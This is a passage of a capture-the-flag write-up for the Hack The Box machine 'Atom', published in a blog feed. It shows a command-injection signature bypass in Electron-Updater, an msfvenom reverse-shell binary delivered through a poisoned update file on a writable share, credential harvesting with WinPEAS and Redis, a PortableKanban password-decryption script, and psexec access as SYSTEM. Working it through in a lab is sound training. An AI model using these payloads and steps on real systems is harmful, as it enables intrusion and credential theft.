  client3                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  UAT_Testing_Procedures.pdf          A    <span class="m">35202</span>  Fri Apr  <span class="m">9</span> 07:18:08 <span class="m">2021</span>

                <span class="m">4413951</span> blocks of size 4096. <span class="m">1361569</span> blocks available
smb: <span class="se">\&gt;</span> recurse on
smb: <span class="se">\&gt;</span> prompt off
smb: <span class="se">\&gt;</span> mget *
getting file <span class="se">\U</span>AT_Testing_Procedures.pdf of size <span class="m">35202</span> as UAT_Testing_Procedures.pdf <span class="o">(</span>121.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 121.5 KiloBytes/sec<span class="o">)</span>
</code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
<p>Both port 80 and 443 are display the same site, it&rsquo;s a software company site called &ldquo;Heed Solutions&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  /></div>
</p>
<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  /></div>
</p>
<p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 atom.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>After the hostname added, the site still shows the same content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ curl -s -k https://10.10.10.237/ <span class="p">|</span> wc -c
<span class="m">7581</span>
â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ curl -s -k http://10.10.10.237/ <span class="p">|</span> wc -c 
<span class="m">7581</span>
â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ curl -s -k http://atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ curl -s -k https://atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
</code></pre></div><h3 id="analysis">Analysis</h3>
<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«lootÂ» Â«10.10.14.49Â» 
$ file heedv1_setup_1.0.0.exe 
heedv1_setup_1.0.0.exe: PE32 executable <span class="o">(</span>GUI<span class="o">)</span> Intel 80386, <span class="k">for</span> MS Windows, Nullsoft Installer self-extracting archive
</code></pre></div><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» 
$ tree
.
â”œâ”€â”€ <span class="nv">$PLUGINSDIR</span>
â”‚Â Â  â”œâ”€â”€ app-64
...&lt;SNIP&gt;...
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ natives_blob.bin
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ resources
â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ app.asar
â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ app-update.yml <span class="c1"># ==&gt; Updater config</span>
â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ electron.asar
â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ elevate.exe
â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ inspector
...&lt;SNIP&gt;...

<span class="m">73</span> directories, <span class="m">274</span> files
</code></pre></div><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» 
$ cat ./<span class="se">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
provider: generic
url: <span class="s1">&#39;http://updates.atom.htb&#39;</span>
publisherName:
  - HackTheBox
</code></pre></div><p>And again, it is the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» 
$ curl -s http://updates.atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
</code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
<ul>
<li>The app is packed with electron-builder</li>
<li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  /></div>
</p>
<p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jason">Shell as Jason</h3>
<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check on the new version of binary file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">execFile(&#34;powershell.exe&#34;, [&#34;-NoProfile&#34;, &#34;-NonInteractive&#34;, &#34;-InputFormat&#34;, &#34;None&#34;, &#34;-Command&#34;, `Get-AuthenticodeSignature &#39;${tempUpdateFile}&#39; | ConvertTo-Json -Compress`], {
...&lt;SNIP&gt;...
</code></pre></div><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
<blockquote>
<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
</blockquote>
<p>The following is an example of malicious update definition that will pop a calculator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">version: 2.0.0
path: u&#39;;calc;&#39;pdate.exe
sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
releaseDate: &#39;2021-01-24T13:44:59.064Z&#39;
</code></pre></div><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">`Get-AuthenticodeSignature &#39;u&#39;;payload;&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</code></pre></div><p>Now that if a single quote <code>'</code> is added to <code>path</code>, it becomes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">`Get-AuthenticodeSignature &#39;u&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</code></pre></div><p>But then, it would breaks the signature verification.  And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote ðŸ˜….</p>
<p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.49 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f exe -o i<span class="se">\&#39;</span>amf.exe
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span class="m">460</span> bytes
Final size of exe file: <span class="m">7168</span> bytes
Saved as: i<span class="err">&#39;</span>amf.exe
</code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
$ shasum -a <span class="m">512</span> i<span class="se">\&#39;</span>amf.exe <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> xxd -r -p <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span>
Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span class="o">==</span>
</code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="m">2.0.1</span><span class="w">
</span><span class="w"></span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">http://10.10.14.83/i&#39;amf.exe</span><span class="w">
</span><span class="w"></span><span class="nt">sha512</span><span class="p">:</span><span class="w"> </span><span class="l">Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==</span><span class="w">
</span><span class="w"></span><span class="nt">releaseDate</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;2021-01-24T13:44:59.064Z&#39;</span><span class="w">
</span></code></pre></div><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
$ smbclient -N //10.10.10.237/Software_Updates -c <span class="s2">&#34;put iamf-update.yml client1/latest.yml&#34;</span>  <span class="o">&amp;&amp;</span> nc -nvlp <span class="m">53</span>
putting file iamf-update.yml as <span class="se">\c</span>lient1<span class="se">\l</span>atest.yml <span class="o">(</span>1.1 kb/s<span class="o">)</span> <span class="o">(</span>average 1.1 kb/s<span class="o">)</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">64352</span>
Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
whoami
atom<span class="se">\j</span>ason

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
</code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\j</span>ason<span class="se">\D</span>esktop&gt;type user.txt
<span class="nb">type</span> user.txt
b77e754354e186f...&lt;SNIP&gt;...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
[+] Checking Credential manager
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              ATOM\jason
     Password:               kidvscat_electron_@123
     Target:                ATOM\jason
     PersistenceType:       Enterprise
     LastWriteTime:         3/31/2021 2:53:49 AM
</code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp. Its config contains an encrypted Redis database password (The clear password revealed in the next section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
type PortableKanban\PortableKanban.cfg
{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="redis-revisited">Redis Revisited</h4>
<p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
type redis.windows.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
type redis.windows-service.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ rlwrap nc -nv 10.10.10.237 <span class="m">6379</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>redis<span class="o">)</span> open
AUTH jason kidvscat_electron_@123
-ERR wrong number of arguments <span class="k">for</span> <span class="s1">&#39;auth&#39;</span> <span class="nb">command</span>
AUTH kidvscat_electron_@123
-ERR invalid password
AUTH kidvscat_yes_kidvscat
+OK
</code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p>
<p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">INFO
$1938
# Server
redis_version:3.0.504
...&lt;SNIP&gt;...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
</code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p>
<p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">SELECT 0
+OK
KEYS *
*4
$48
pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$11
pk:ids:User
$20
pk:ids:MetaDataClass
$57
pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
</code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$207
{&#34;Id&#34;:&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;,&#34;Name&#34;:&#34;Administrator&#34;,&#34;Initials&#34;:&#34;&#34;,&#34;Email&#34;:&#34;&#34;,&#34;EncryptedPassword&#34;:&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;,&#34;Role&#34;:&#34;Admin&#34;,&#34;Inactive&#34;:false,&#34;TimeStamp&#34;:637530169606440253}
</code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">from base64 import b64decode
import sys
import des 

<span class="nv">key</span> <span class="o">=</span> des.DesKey<span class="o">(</span>b<span class="s1">&#39;7ly6UznJ&#39;</span><span class="o">)</span>
<span class="nv">iv</span> <span class="o">=</span> b<span class="s1">&#39;XuVUm5fR&#39;</span>

try:    
	<span class="nv">passwd</span> <span class="o">=</span> b64decode<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]</span>.encode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
except IndexError:
	print<span class="o">(</span><span class="s1">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span class="o">[</span>0<span class="o">])</span>
    
	sys.exit<span class="o">(</span>-1<span class="o">)</span>

<span class="nv">dec_password</span> <span class="o">=</span> key.decrypt<span class="o">(</span>passwd, <span class="nv">initial</span><span class="o">=</span>iv, <span class="nv">padding</span><span class="o">=</span>True<span class="o">)</span>
print<span class="o">(</span><span class="s2">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
</code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«atomÂ» Â«10.10.14.83Â»
$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
<span class="o">[</span>+<span class="o">]</span> Decrypted Password: kidvscat_admin_@123
</code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ impacket-psexec atom/administrator:<span class="s1">&#39;kidvscat_admin_@123&#39;</span>@10.10.10.237
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.237.....
<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
<span class="o">[</span>*<span class="o">]</span> Uploading file FCSITnEj.exe
<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.237.....
<span class="o">[</span>*<span class="o">]</span> Creating service DCLl on 10.10.10.237.....
<span class="o">[</span>*<span class="o">]</span> Starting service DCLl.....
<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> hostname
nt authority<span class="se">\s</span>ystem
ATOM

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
   IPv4 Address. . . . . . . . . . . : 10.10.10.237
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                       10.10.10.2
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></li>
<li><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
